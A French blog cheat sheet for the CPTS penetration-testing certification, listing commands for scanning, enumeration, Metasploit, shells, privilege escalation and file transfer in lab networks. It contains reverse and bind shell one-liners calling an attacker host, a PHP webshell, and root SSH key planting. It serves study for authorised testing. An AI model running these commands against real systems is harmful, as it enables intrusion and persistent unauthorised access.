---
title: "Aide-mémoire CPTS"
date: 2025-05-18 10:00:00 +0200
categories: [Aide-mémoire, CPTS]
tags: [cpts, aide-mémoire]
toc: true
image: /assets/images/CPTS-logo.png
---

# Aide-mémoire CPTS

## Outils de Base

### Commandes Générales et Utilitaires

| **Commande**             | **Description**                                    |
|-------------------------|--------------------------------------------------|
| `sudo openvpn user.ovpn` | Connexion au VPN                                  |
| `ifconfig`/`ip a`        | Afficher notre adresse IP                         |
| `netstat -rn`            | Afficher les réseaux accessibles via le VPN       |
| `ssh user@10.10.10.10`   | Connexion SSH à un serveur distant               |
| `ftp 10.129.42.253`      | Connexion FTP à un serveur distant               |

### Tmux - Gestionnaire de Terminal

| **Commande**      | **Description**                               |
|------------------|---------------------------------------------|
| `tmux`           | Démarrer tmux                                |
| `ctrl+b`         | Préfixe par défaut de tmux                   |
| `prefix c`       | Nouvelle fenêtre                             |
| `prefix 1`       | Basculer vers la fenêtre (`1`)              |
| `prefix shift+%` | Diviser le panneau verticalement             |
| `prefix shift+"` | Diviser le panneau horizontalement           |
| `prefix ->`      | Basculer vers le panneau de droite           |

### Vim - Éditeur de Texte

| **Commande** | **Description**                                |
|-------------|----------------------------------------------|
| `vim file`   | Ouvrir un fichier avec vim                    |
| `esc+i`      | Entrer en mode `insertion`                    |
| `esc`        | Retourner au mode `normal`                    |
| `x`          | Couper un caractère                           |
| `dw`         | Couper un mot                                 |
| `dd`         | Couper une ligne entière                      |
| `yw`         | Copier un mot                                 |
| `yy`         | Copier une ligne entière                      |
| `p`          | Coller                                        |
| `:1`         | Aller à la ligne numéro 1                     |
| `:w`         | Sauvegarder le fichier                        |
| `:q`         | Quitter                                       |
| `:q!`        | Quitter sans sauvegarder                      |
| `:wq`        | Sauvegarder et quitter                        |

## Tests de Pénétration

### Scan de Services

| **Commande**                                                          | **Description**                                                    |
|----------------------------------------------------------------------|------------------------------------------------------------------|
| `nmap 10.129.42.253`                                                   | Lancer nmap sur une IP                                            |
| `nmap -sV -sC -p- 10.129.42.253`                                      | Lancer un scan de scripts nmap sur une IP                         |
| `locate scripts/citrix`                                                | Lister les scripts nmap disponibles                               |
| `nmap --script smb-os-discovery.nse -p445 10.10.10.40`                | Exécuter un script nmap spécifique                                |
| `netcat 10.10.10.10 22`                                               | Récupérer la bannière d'un port ouvert                            |
| `smbclient -N -L \\\\10.129.42.253`                                   | Lister les partages SMB                                           |
| `smbclient \\\\10.129.42.253\\users`                                  | Se connecter à un partage SMB                                     |
| `snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0`           | Scanner SNMP sur une IP                                           |
| `onesixtyone -c dict.txt 10.129.42.254`                               | Force brute de la chaîne secrète SNMP                            |

### Énumération Web

| **Commande**                                                                           | **Description**                                                 |
|---------------------------------------------------------------------------------------|---------------------------------------------------------------|
| `gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt`        | Scanner les répertoires d'un site web                          |
| `gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt` | Scanner les sous-domaines d'un site web                        |
| `curl -IL https://www.inlanefreight.com`                                              | Récupérer la bannière du site web                              |
| `whatweb 10.10.10.121`                                                                | Lister les détails du serveur web/certificats                  |
| `curl 10.10.10.121/robots.txt`                                                        | Lister les répertoires potentiels dans `robots.txt`            |
| `ctrl+U`                                                                              | Voir le code source (dans Firefox)                             |

### Exploits Publics

| **Commande**                                    | **Description**                                                |
|------------------------------------------------|--------------------------------------------------------------|
| `searchsploit openssh 7.2`                      | Rechercher des exploits publics                               |
| `msfconsole`                                    | MSF: Démarrer Metasploit Framework                            |
| `search exploit eternalblue`                    | MSF: Rechercher des exploits publics dans MSF                 |
| `use exploit/windows/smb/ms17_010_psexec`       | MSF: Utiliser un module MSF                                   |
| `show options`                                  | MSF: Afficher les options requises                            |
| `set RHOSTS 10.10.10.40`                       | MSF: Définir une valeur pour une option                       |
| `check`                                         | MSF: Tester si le serveur est vulnérable                      |
| `exploit`                                       | MSF: Exécuter l'exploit                                       |

### Utilisation des Shells

| **Commande**                                                                           | **Description**                                               |
|---------------------------------------------------------------------------------------|-------------------------------------------------------------|
| `nc -lvnp 1234`                                                                        | Démarrer un écouteur `nc` sur un port local                  |
| `bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'`                                | Envoyer un reverse shell                                     |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc 10.10.10.10 1234 >/tmp/f`   | Autre commande pour reverse shell                            |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/bash -i 2>&1\|nc -lvp 1234 >/tmp/f`        | Démarrer un bind shell                                       |
| `nc 10.10.10.1 1234`                                                                  | Se connecter à un bind shell                                 |
| `python -c 'import pty; pty.spawn("/bin/bash")'`                                      | Améliorer shell TTY (1)                                      |
| `ctrl+z` puis `stty raw -echo` puis `fg` puis `enter` deux fois                       | Améliorer shell TTY (2)                                      |
| `echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php`                     | Créer un webshell php                                        |
| `curl http://SERVER_IP:PORT/shell.php?cmd=id`                                         | Exécuter une commande sur un webshell                        |

### Élévation de Privilèges

| **Commande**                                                                    | **Description**                                                |
|--------------------------------------------------------------------------------|--------------------------------------------------------------|
| `./linpeas.sh`                                                                  | Exécuter le script `linpeas`                                  |
| `sudo -l`                                                                       | Lister les privilèges `sudo` disponibles                      |
| `sudo -u user /bin/echo Hello World!`                                          | Exécuter une commande avec `sudo`                             |
| `sudo su -`                                                                     | Passer à l'utilisateur root                                   |
| `sudo su user -`                                                               | Passer à un utilisateur spécifique                            |
| `ssh-keygen -f key`                                                            | Créer une nouvelle clé SSH                                    |
| `echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys`  | Ajouter la clé publique à l'utilisateur                      |
| `ssh root@10.10.10.10 -i key`                                                 | Se connecter en SSH avec la clé privée                        |

### Transfert de Fichiers

| **Commande**                                                          | **Description**                                                |
|----------------------------------------------------------------------|--------------------------------------------------------------|
| `python3 -m http.server 8000`                                          | Démarrer un serveur web local                                 |
| `wget http://10.10.14.1:8000/linpeas.sh`                              | Télécharger un fichier sur le serveur distant                 |
| `curl http://10.10.14.1:8000/linenum.sh -o linenum.sh`                | Télécharger avec curl                                         |
| `scp linenum.sh user@remotehost:/tmp/linenum.sh`                      | Transférer un fichier avec `scp`                             |
| `base64 shell -w 0`                                                   | Convertir un fichier en `base64`                              |
| `echo f0VMR...SNIO...InmDwU \| base64 -d > shell`                    | Convertir de `base64` vers le format original                 |
| `md5sum shell`                                                        | Vérifier le checksum md5                                      |

## Énumération d'Infrastructure

### Reconnaissance Externe

| **Commande**                                                         | **Description**                                    |
|---------------------------------------------------------------------|----------------------------------------------------|
| `curl -s https://crt.sh\?q\=<domaine-cible>\&output\=json \| jq .`   | Transparence des certificats                        |
| `for i in $(cat ip-addresses.txt);do shodan host $i;done`            | Scanner des IPs avec Shodan                         |

### Services Spécifiques

#### FTP

| **Commande**                                                          | **Description**                                    |
|----------------------------------------------------------------------|--------------------------------------------------|
| `ftp <FQDN/IP>`                                                        | Interagir avec le service FTP                      |
| `nc -nv <FQDN/IP> 21`                                                 | Connexion FTP avec netcat                          |
| `telnet <FQDN/IP> 21`                                                 | Connexion FTP avec telnet                          |
| `openssl s_client -connect <FQDN/IP>:21 -starttls ftp`               | Connexion FTP chiffrée                             |
| `wget -m --no-passive ftp://anonymous:anonymous@<cible>`              | Télécharger tous les fichiers disponibles          |

#### SMB

| **Commande**                                                          | **Description**                                    |
|----------------------------------------------------------------------|--------------------------------------------------|
| `smbclient -N -L //<FQDN/IP>`                                         | Session null SMB                                   |
| `smbclient //<FQDN/IP>/<partage>`                                     | Connexion à un partage SMB                         |
| `rpcclient -U "" <FQDN/IP>`                                           | Interaction RPC                                    |
| `samrdump.py <FQDN/IP>`                                               | Énumération des utilisateurs avec Impacket         |
| `smbmap -H <FQDN/IP>`                                                 | Énumération des partages SMB                       |
| `crackmapexec smb <FQDN/IP> --shares -u '' -p ''`                    | Énumération SMB avec session null                  |
| `enum4linux-ng.py <FQDN/IP> -A`                                       | Énumération SMB complète                           |

#### NFS

| **Commande**                                                          | **Description**                                    |
|----------------------------------------------------------------------|--------------------------------------------------|
| `showmount -e <FQDN/IP>`                                              | Afficher les partages NFS disponibles              |
| `mount -t nfs <FQDN/IP>:/<partage> ./target-NFS/ -o nolock`          | Monter un partage NFS                             |
| `umount ./target-NFS`                                                 | Démonter un partage NFS                            |

#### DNS

| **Commande**                                                          | **Description**                                    |
|----------------------------------------------------------------------|--------------------------------------------------|
| `dig ns <domaine.tld> @<serveur-dns>`                                 | Requête NS vers un serveur DNS                     |
| `dig any <domaine.tld> @<serveur-dns>`                                | Requête ANY vers un serveur DNS                    |
| `dig axfr <domaine.tld> @<serveur-dns>`                               | Requête AXFR vers un serveur DNS                   |
| `dnsenum --dnsserver <serveur-dns> --enum -p 0 -s 0 -o found_subdomains.txt -f ~/subdomains.list <domaine.tld>` | Force brute des sous-domaines |

#### SMTP

| **Commande**                                                          | **Description**                                    |
|----------------------------------------------------------------------|--------------------------------------------------|
| `telnet <FQDN/IP> 25`                                                 | Connexion au service SMTP                          |
| `sudo nmap $ip -sC -sV -p25`                                          | Énumération du service SMTP                        |
| `for user in $(cat users.txt); do echo VRFY $user \| nc -nv -w 6 $ip 25 ; done` | Énumération des utilisateurs        |

#### IMAP/POP3

| **Commande**                                                          | **Description**                                    |
|----------------------------------------------------------------------|--------------------------------------------------|
| `openssl s_client -connect <FQDN/IP>:imaps`                           | Connexion au service IMAPS                         |
| `openssl s_client -connect <FQDN/IP>:pop3s`                           | Connexion au service POP3S                         |

############
Commandes IMAP
############
# Connexion utilisateur
a LOGIN utilisateur mot_de_passe

# Liste tous les répertoires
a LIST "" *

# Crée une boîte mail
a CREATE "INBOX"

# Supprime une boîte mail
a DELETE "INBOX"

# Renomme une boîte mail
a RENAME "ALire" "Important"

# Retourne la liste des boîtes actives/souscrites
a LSUB "" *

# Sélectionne une boîte mail
a SELECT INBOX

# Quitte la boîte sélectionnée
a UNSELECT INBOX

# Récupère les données d'un message
a FETCH <ID> all
# Pour récupérer le corps:
a FETCH <ID> BODY.PEEK[TEXT]

# Supprime les messages marqués "Deleted"
a CLOSE

# Ferme la connexion
a LOGOUT

############
Commandes POP3
############
# Identification de l'utilisateur
USER utilisateur

# Authentification avec mot de passe
PASS mot_de_passe

# Demande le nombre d'emails sauvegardés
STAT

# Demande le nombre et la taille de tous les emails
LIST

# Demande la livraison d'un email par ID
RETR id

# Demande la suppression d'un email par ID
DELE id

# Affiche les capacités du serveur
CAPA

# Réinitialise les informations transmises
RSET

# Ferme la connexion
QUIT

